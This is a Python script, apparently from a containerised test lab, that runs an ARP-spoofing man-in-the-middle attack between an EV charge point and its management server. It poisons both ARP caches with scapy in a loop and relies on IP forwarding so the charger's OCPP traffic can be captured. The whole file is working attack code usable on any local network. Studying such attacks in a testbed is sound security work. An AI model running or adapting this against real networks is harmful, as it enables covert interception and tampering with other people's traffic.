#!/usr/bin/env python3
"""
ARP spoofing pre-step attacker.

Positions the attacker between the charge point (CP) and the legitimate
CSMS by poisoning their ARP caches. Enables IP forwarding so the CP's
OCPP WebSocket traffic is routed through the attacker container, where a
sidecar tcpdump captures it. Restores the real ARP mappings on exit.

Environment variables:
  TARGET1_IP      IP of the first target (default: CSMS at 172.30.0.10)
  TARGET2_IP      IP of the second target (default: CP at 172.30.0.20)
  INTERFACE       Network interface to use (auto-detected if not set)
  SPOOF_INTERVAL_S Seconds between ARP spoof bursts (default: 2)
"""

import json
import logging
import os
import signal
import sys
import time
import traceback
from threading import Event

from scapy.all import ARP, Ether, conf, get_if_hwaddr, get_if_list, sendp, srp

LOG_FILE = "/tmp/arp_attacker.log"

logging.basicConfig(
    level=logging.INFO,
    format="%(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler(LOG_FILE, mode="a"),
    ],
)
logger = logging.getLogger("arp_attacker")

TARGET1_IP = os.getenv("TARGET1_IP", "172.30.0.10")
TARGET2_IP = os.getenv("TARGET2_IP", "172.30.0.20")
INTERFACE = os.getenv("INTERFACE", "")
SPOOF_INTERVAL_S = float(os.getenv("SPOOF_INTERVAL_S", "2"))
MAC_DISCOVERY_TIMEOUT_S = 60

stop_event = Event()


def emit_log(level: str, event: str, detail: str, extra: dict = None) -> None:
    """Emit a structured JSON log line."""
    record = {
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "level": level,
        "event": event,
        "detail": detail,
    }
    if extra:
        record.update(extra)
    logger.info(json.dumps(record))


def detect_interface() -> str:
    """Return the requested interface or the first non-loopback interface."""
    if INTERFACE:
        return INTERFACE

    try:
        ifaces = get_if_list()
    except Exception as exc:
        emit_log("WARN", "interface_list_failed", f"Could not list interfaces: {exc}")
        ifaces = []

    for iface in ifaces:
        if iface != "lo" and not iface.startswith("lo"):
            emit_log("INFO", "interface_auto_detected", f"Using auto-detected interface {iface}")
            return iface

    # Fallback: scapy's default interface
    try:
        iface = conf.iface
        emit_log("INFO", "interface_default", f"Using scapy default interface {iface}")
        return iface
    except Exception:
        pass

    raise RuntimeError("Could not detect a non-loopback network interface; set INTERFACE env var")


def discover_mac(ip: str, iface: str, timeout: int = 3) -> str | None:
    """Resolve the real MAC address for an IP on the local network."""
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    try:
        ans, _ = srp(packet, timeout=timeout, iface=iface, verbose=False)
        for _, rcv in ans:
            return rcv[Ether].src
    except Exception as exc:
        emit_log("WARN", "mac_discovery_error", f"Error resolving {ip} on {iface}: {exc}")
    return None


def verify_ip_forward() -> None:
    """Verify that Compose enabled forwarding in this network namespace.

    Docker applies ``net.ipv4.ip_forward=1`` before starting the container,
    while the corresponding procfs entry can remain read-only inside it.
    """
    with open("/proc/sys/net/ipv4/ip_forward", "r", encoding="ascii") as f:
        value = f.read().strip()
    if value != "1":
        raise RuntimeError(
            "net.ipv4.ip_forward is not enabled; keep the Compose sysctl "
            "net.ipv4.ip_forward=1 on the attacker service"
        )


def send_spoof(target_ip: str, target_mac: str, spoof_ip: str, attacker_mac: str, iface: str) -> None:
    """Send a spoofed ARP reply telling target_ip that spoof_ip is at attacker_mac."""
    packet = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        hwsrc=attacker_mac,
    )
    sendp(packet, iface=iface, verbose=False)


def restore_arp(target_ip: str, target_mac: str, spoof_ip: str, spoof_mac: str, iface: str) -> None:
    """Restore the real ARP mapping for spoof_ip on target_ip."""
    packet = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        hwsrc=spoof_mac,
    )
    sendp(packet, iface=iface, verbose=False)


def signal_handler(signum: int, _frame) -> None:
    emit_log("INFO", "signal_received", f"Received signal {signum}, stopping attack")
    stop_event.set()


def main() -> None:
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    emit_log("INFO", "attack_start", "ARP spoofing MITM pre-step starting", {
        "target1_ip": TARGET1_IP,
        "target2_ip": TARGET2_IP,
        "interface_env": INTERFACE,
        "interval_s": SPOOF_INTERVAL_S,
    })

    try:
        iface = detect_interface()
    except Exception as exc:
        emit_log("ERROR", "interface_detect_failed", f"{exc}")
        sys.exit(1)

    try:
        attacker_mac = get_if_hwaddr(iface)
    except Exception as exc:
        emit_log("ERROR", "interface_error", f"Cannot get MAC for {iface}: {exc}")
        sys.exit(1)

    emit_log("INFO", "attacker_mac", "Attacker interface ready", {
        "interface": iface,
        "mac": attacker_mac,
    })

    # Discover real MACs. Retry until both are up; CP starts after the attacker.
    t1_mac: str | None = None
    t2_mac: str | None = None
    deadline = time.time() + MAC_DISCOVERY_TIMEOUT_S
    while (not t1_mac or not t2_mac) and time.time() < deadline and not stop_event.is_set():
        if not t1_mac:
            t1_mac = discover_mac(TARGET1_IP, iface)
            if t1_mac:
                emit_log("INFO", "target_discovered", f"Discovered MAC for {TARGET1_IP}", {
                    "target_ip": TARGET1_IP,
                    "target_mac": t1_mac,
                })
        if not t2_mac:
            t2_mac = discover_mac(TARGET2_IP, iface)
            if t2_mac:
                emit_log("INFO", "target_discovered", f"Discovered MAC for {TARGET2_IP}", {
                    "target_ip": TARGET2_IP,
                    "target_mac": t2_mac,
                })
        if not t1_mac or not t2_mac:
            emit_log("INFO", "discovery_wait", "Waiting for targets to come online...")
            stop_event.wait(2)

    if not t1_mac or not t2_mac:
        emit_log("ERROR", "mac_discovery_failed", "Could not discover one or both target MACs")
        sys.exit(1)

    # Enable IP forwarding so the kernel routes traffic between the targets.
    try:
        verify_ip_forward()
        emit_log("INFO", "ip_forward_enabled", "IP forwarding enabled — attacker will relay traffic")
    except Exception as exc:
        emit_log("ERROR", "ip_forward_failed", f"Failed to enable IP forwarding: {exc}")
        sys.exit(1)

    emit_log("SUCCESS", "mitm_position_active", "ARP spoofing active — traffic is routed through attacker", {
        "attacker_mac": attacker_mac,
        "target1_ip": TARGET1_IP,
        "target1_mac": t1_mac,
        "target2_ip": TARGET2_IP,
        "target2_mac": t2_mac,
    })

    # Main ARP poisoning loop.
    while not stop_event.is_set():
        try:
            send_spoof(TARGET1_IP, t1_mac, TARGET2_IP, attacker_mac, iface)
            send_spoof(TARGET2_IP, t2_mac, TARGET1_IP, attacker_mac, iface)
            emit_log("INFO", "arp_poison", "Sent bidirectional spoofed ARP replies", {
                "target1_ip": TARGET1_IP,
                "target2_ip": TARGET2_IP,
            })
        except Exception as exc:
            emit_log("ERROR", "arp_send_error", f"Failed to send ARP spoof packet: {exc}")
        stop_event.wait(SPOOF_INTERVAL_S)

    # Restore real ARP mappings on shutdown.
    emit_log("INFO", "restoring_arp", "Restoring real ARP caches")
    try:
        restore_arp(TARGET1_IP, t1_mac, TARGET2_IP, t2_mac, iface)
        restore_arp(TARGET2_IP, t2_mac, TARGET1_IP, t1_mac, iface)
        emit_log("INFO", "arp_restored", "Real ARP mappings restored")
    except Exception as exc:
        emit_log("ERROR", "arp_restore_error", f"Failed to restore ARP caches: {exc}")

    emit_log("INFO", "attack_complete", "ARP spoofing MITM pre-step complete")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        emit_log("INFO", "interrupted", "Attack interrupted by user")
        sys.exit(0)
    except Exception as exc:
        emit_log("ERROR", "unexpected_error", f"Unexpected error: {exc}\n{traceback.format_exc()}")
        sys.exit(1)
